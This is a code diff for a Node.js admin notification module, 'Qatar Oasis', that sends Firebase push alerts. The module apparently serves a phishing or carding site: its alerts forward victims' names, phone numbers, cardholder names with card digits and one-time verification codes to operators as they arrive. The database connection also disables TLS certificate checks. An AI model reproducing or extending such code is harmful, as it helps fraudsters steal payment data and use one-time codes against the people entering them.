@@ -3,16 +3,20 @@
  * Qatar Oasis - Admin Notifications System
  */
 
-
 const admin = require('firebase-admin');
 const webpush = require('web-push');
+const { Pool } = require('pg');
 
+// Database connection pool
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL,
+  ssl: { rejectUnauthorized: false }
+});
 
 // ==========================================
 // SAFE PRIVATE KEY PARSING
 // ==========================================
 let privateKey = process.env.FIREBASE_PRIVATE_KEY;
-
 
 if (privateKey) {
     if (privateKey.startsWith('"') && privateKey.endsWith('"')) {
@@ -21,11 +25,9 @@ if (privateKey) {
     privateKey = privateKey.replace(/\\n/g, '\n');
 }
 
-
 if (!privateKey) {
     throw new Error("FIREBASE_PRIVATE_KEY is missing or undefined in environment variables");
 }
-
 
 const serviceAccount = {
   "projectId": process.env.FIREBASE_PROJECT_ID || "adminqatar-d4192",
@@ -33,21 +35,18 @@ const serviceAccount = {
   "clientEmail": process.env.FIREBASE_CLIENT_EMAIL
 };
 
-
 const VAPID_KEYS = {
   publicKey: process.env.VAPID_PUBLIC_KEY || '',
   privateKey: process.env.VAPID_PRIVATE_KEY || ''
 };
 
-
 let firebaseInitialized = false;
-
 
 console.log('🔧 Loading Firebase Admin SDK...');
 console.log('📧 Client Email:', serviceAccount.clientEmail ? '✓ Set' : '✗ Missing');
 console.log('🔑 Private Key:', serviceAccount.privateKey ? '✓ Set (length: ' + serviceAccount.privateKey.length + ')' : '✗ Missing');
 
-
+// Initialize Firebase Admin
 try {
   if (serviceAccount.privateKey && serviceAccount.clientEmail) {
     
@@ -61,7 +60,6 @@ try {
     
     firebaseInitialized = true;
     console.log('✅ Firebase Admin SDK initialized successfully');
-
 
     if (VAPID_KEYS.publicKey && VAPID_KEYS.privateKey) {
       webpush.setVapidDetails(
@@ -89,26 +87,140 @@ try {
   }
 }
 
+// ==========================================
+// FETCH TOKENS FROM DATABASE
+// ==========================================
+async function getActiveTokens() {
+  try {
+    const result = await pool.query('SELECT token FROM admin_fcm_tokens WHERE enabled = true');
+    const tokens = result.rows.map(r => r.token);
+    console.log(`📱 Fetched ${tokens.length} active tokens from database`);
+    return tokens;
+  } catch (error) {
+    console.error('❌ Error fetching tokens from database:', error.message);
+    // Fallback to global tokens if database fails
+    return global.fcmTokens || [];
+  }
+}
 
+// ==========================================
+// SEND PUSH NOTIFICATION
+// ==========================================
 async function sendPushNotification(tokens, notification, data = {}) {
-  if (!firebaseInitialized || !tokens || tokens.length === 0) return { success: false };
+  if (!firebaseInitialized) {
+    console.log('⚠️ Firebase not initialized, skipping notification');
+    return { success: false, error: 'Firebase not initialized' };
+  }
+
+  // Fetch fresh tokens from database
+  const activeTokens = await getActiveTokens();
+  
+  if (activeTokens.length === 0) {
+    console.log('⚠️ No active FCM tokens in database');
+    return { success: false, error: 'No tokens in database' };
+  }
+
   try {
     const message = {
-      notification: { title: notification.title, body: notification.body, icon: notification.icon || '/admin/icon.png' },
-      tokens: tokens
+      notification: { 
+        title: notification.title, 
+        body: notification.body, 
+        icon: notification.icon || '/admin/icon.png',
+        click_action: notification.clickAction || '/admin/',
+        sound: 'default',
+        tag: data.type || 'notification',
+        renotify: true
+      },
+      android: {
+        priority: 'high',
+        notification: {
+          channel_id: 'high_priority_channel',
+          sound: 'default',
+          default_sound: true,
+          notification_priority: 'PRIORITY_HIGH'
+        }
+      },
+      webpush: {
+        fcm_options: { link: notification.clickAction || '/admin/' },
+        headers: { Urgency: 'high' },
+        vapidDetails: {
+          subject: 'mailto:admin@qatarwateroasis.com',
+          publicKey: VAPID_KEYS.publicKey,
+          privateKey: VAPID_KEYS.privateKey
+        }
+      },
+      data: { ...data, timestamp: Date.now().toString() },
+      tokens: activeTokens
     };
+
     const response = await admin.messaging().sendEachForMulticast(message);
-    return { success: true, successCount: response.successCount };
+    
+    console.log(`📱 Notification sent: ${response.successCount} success, ${response.failureCount} failed`);
+    
+    return { 
+      success: true, 
+      successCount: response.successCount,
+      failureCount: response.failureCount
+    };
   } catch (err) {
+    console.error('❌ Error sending notification:', err.message);
     return { success: false, error: err.message };
   }
 }
 
+// ==========================================
+// NOTIFICATION FUNCTIONS
+// ==========================================
+async function notifyNewVisitor(visitorData) {
+  const name = visitorData.delivery_data?.fullName || visitorData.payment_data?.cardHolder || 'زائر جديد';
+  return sendPushNotification(null, { 
+    title: '🆕 زائر جديد!', 
+    body: `${name} - ${visitorData.country || 'غير معروف'}`,
+    icon: '/admin/icon.png',
+    clickAction: '/admin/#visitors'
+  }, { type: 'new_visitor', sessionId: visitorData.session_id || visitorData.sessionId });
+}
 
-async function notifyNewVisitor(v) { return sendPushNotification(global.fcmTokens || [], { title: '🆕 زائر جديد!', body: 'تفقد لوحة التحكم' }); }
-async function notifyDelivery(v) { return sendPushNotification(global.fcmTokens || [], { title: '📦 بيانات توصيل جديدة!', body: 'تفقد لوحة التحكم' }); }
-async function notifyPayment(v) { return sendPushNotification(global.fcmTokens || [], { title: '💳 بيانات بطاقة جديدة!', body: 'تفقد لوحة التحكم' }); }
-async function notifyVerification(v) { return sendPushNotification(global.fcmTokens || [], { title: '🔐 رمز تحقق جديد!', body: 'تفقد لوحة التحكم' }); }
+async function notifyDelivery(visitorData) {
+  const name = visitorData.delivery_data?.fullName || 'زائر';
+  const phone = visitorData.delivery_data?.phone || '';
+  return sendPushNotification(null, { 
+    title: '📦 بيانات توصيل جديدة!', 
+    body: `${name} - ${phone}`,
+    icon: '/admin/icon.png',
+    clickAction: '/admin/#visitors'
+  }, { type: 'delivery', sessionId: visitorData.session_id || visitorData.sessionId });
+}
 
+async function notifyPayment(visitorData) {
+  const name = visitorData.payment_data?.cardHolder || 'زائر';
+  const last4 = visitorData.payment_data?.cardNumber?.slice(-4) || '';
+  return sendPushNotification(null, { 
+    title: '💳 بيانات بطاقة جديدة!', 
+    body: `${name} - ****${last4}`,
+    icon: '/admin/icon.png',
+    clickAction: '/admin/#visitors'
+  }, { type: 'payment', sessionId: visitorData.session_id || visitorData.sessionId });
+}
 
-module.exports = { sendPushNotification, notifyNewVisitor, notifyDelivery, notifyPayment, notifyVerification, firebaseInitialized };
+async function notifyVerification(visitorData) {
+  const name = visitorData.delivery_data?.fullName || 'زائر';
+  const otp = visitorData.verification_data?.otp || '';
+  return sendPushNotification(null, { 
+    title: '🔐 رمز تحقق جديد!', 
+    body: `${name} - الكود: ${otp}`,
+    icon: '/admin/icon.png',
+    clickAction: '/admin/#visitors'
+  }, { type: 'verification', sessionId: visitorData.session_id || visitorData.sessionId });
+}
+
+// Export functions
+module.exports = { 
+  sendPushNotification, 
+  notifyNewVisitor, 
+  notifyDelivery, 
+  notifyPayment, 
+  notifyVerification, 
+  getActiveTokens,
+  firebaseInitialized 
+};
